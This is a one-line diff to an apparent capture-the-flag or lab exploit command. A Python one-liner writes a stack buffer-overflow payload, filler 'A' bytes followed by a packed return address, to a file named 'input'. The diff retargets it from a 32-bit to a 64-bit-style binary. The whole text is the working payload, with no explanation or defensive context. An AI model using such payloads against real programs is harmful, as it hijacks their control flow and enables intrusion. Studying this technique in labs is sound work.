@@ -1,1 +1,1 @@
-python3 -c "import sys; sys.stdout.buffer.write(b'A' * 0x4c + b'\xa6\x91\x04\x08')" > input
+python3 -c "import sys; sys.stdout.buffer.write(b'A' * 40 + b'\x96\x11\x40\x00')" > input
